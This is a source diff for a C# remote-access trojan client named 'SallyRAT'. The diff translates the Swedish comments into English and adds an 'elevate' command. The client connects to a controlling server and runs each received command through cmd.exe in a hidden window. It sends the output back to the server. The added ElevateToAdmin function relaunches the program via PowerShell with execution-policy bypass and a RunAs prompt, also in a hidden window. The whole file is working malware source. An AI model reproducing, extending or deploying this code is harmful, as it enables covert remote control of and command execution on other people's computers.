@@ -3,7 +3,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Diagnostics;
 using System.IO;
-using System.Text;
+using System.Threading;
 
 namespace clientSallyRAT
 {
@@ -11,16 +11,14 @@ namespace clientSallyRAT
     {
         static void Main(string[] args)
         {
-
-            TcpClient client = null; // här skapar vi variabler för TcpClient, NetworkStream, StreamReader och StreamWriter
-
+            TcpClient client = null; // Variables for TcpClient, NetworkStream, StreamReader, and StreamWriter
             NetworkStream stream = null;
             StreamReader reader = null;
             StreamWriter writer = null;
 
-            while (client == null || !client.Connected) // här försöker vi ansluta till servern
+            while (client == null || !client.Connected) // Attempt to connect to the server
             {
-                try 
+                try
                 {
                     Console.WriteLine("Attempting to connect to SallyRAT");
                     client = new TcpClient();
@@ -32,29 +30,31 @@ namespace clientSallyRAT
 
                     Console.WriteLine("YAYYYYY WE HAVE CONNECTED TO SERVER");
                 }
-                catch (Exception ex) // om vi inte kan ansluta till servern så skriver vi ut ett felmeddelande och försöker igen om 5 sekunder
+                catch (Exception ex) // If connection fails, log the error and retry after 5 seconds
                 {
                     Console.WriteLine("Failed to connect to SallyRAT");
                     Console.WriteLine(ex.Message);
                     Console.WriteLine("Trying Again In 5 Seconds.");
-                    System.Threading.Thread.Sleep(5000);
+                    Thread.Sleep(5000);
                 }
             }
-            Console.WriteLine("Successfully Slaved to SallyRAT");
 
             try
             {
-
-                while (client.Connected) // Denna loopen är igång sålänge jag är ansluten till servern
+                while (client.Connected) // This loop runs as long as the client is connected to the server
                 {
                     string command = reader.ReadLine();
+                    Console.WriteLine($"Received command: {command}"); // Log the received command
 
-                    if (string.IsNullOrEmpty(command)) // om kommandot är tomt så ignoreras det och låter loopen starta om
+                    if (string.IsNullOrEmpty(command)) continue;
+
+                    if (command.ToLower() == "elevate")
                     {
+                        ElevateToAdmin(); // Perform elevation to admin rights
                         continue;
                     }
 
-                    Process process = new Process(); // här startar vi en process som kör cmd.exe och kör kommandot som vi skickade från servern
+                    Process process = new Process(); // Start a process to run cmd.exe and execute the command from the server
                     process.StartInfo.FileName = "cmd.exe";
                     process.StartInfo.Arguments = "/c " + command;
                     process.StartInfo.UseShellExecute = false;
@@ -62,20 +62,17 @@ namespace clientSallyRAT
                     process.StartInfo.CreateNoWindow = true;
                     process.Start();
 
-
-
-                    string output; 
-                    while ((output = process.StandardOutput.ReadLine()) != null) // Denna gör att det som kommer upp på clientsided skickas över till Servern och sen kan den även skriva multilined text som tex ipconfig
+                    string output;
+                    while ((output = process.StandardOutput.ReadLine()) != null)
                     {
-                        writer.WriteLine(output); 
+                        writer.WriteLine(output); // Send the output back to the server
                     }
-
-                    writer.WriteLine("END_OF_OUTPUT"); //här skickar vi till servern för "logik" att outputtet är slut PS william är da teacher
-                } 
+                    writer.WriteLine("END_OF_OUTPUT"); // Indicate the end of the output
+                }
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
+                Console.WriteLine($"Error: {e.Message}"); // Log any errors
             }
             finally
             {
@@ -84,7 +81,31 @@ namespace clientSallyRAT
                 stream.Close();
                 client.Close();
             }
+        }
 
+        static void ElevateToAdmin()
+        {
+            try
+            {
+                // Get the path of the current executable
+                string exePath = Process.GetCurrentProcess().MainModule.FileName;
+
+                // Execute command with PowerShell for elevation
+                string command = $"-NoProfile -ExecutionPolicy Bypass -Command \"& {{Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command {exePath}'}}\"";
+                ProcessStartInfo processInfo = new ProcessStartInfo("powershell", $"{command}");
+                Console.WriteLine($"Command to elevate: powershell {command}"); // Log the elevation command
+                processInfo.CreateNoWindow = true;
+                processInfo.UseShellExecute = false;
+                processInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                Process process = new Process();
+                process.StartInfo = processInfo;
+                process.Start();
+                process.WaitForExit();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error elevating to admin: {ex.Message}"); // Log any errors during elevation
+            }
         }
     }
 }
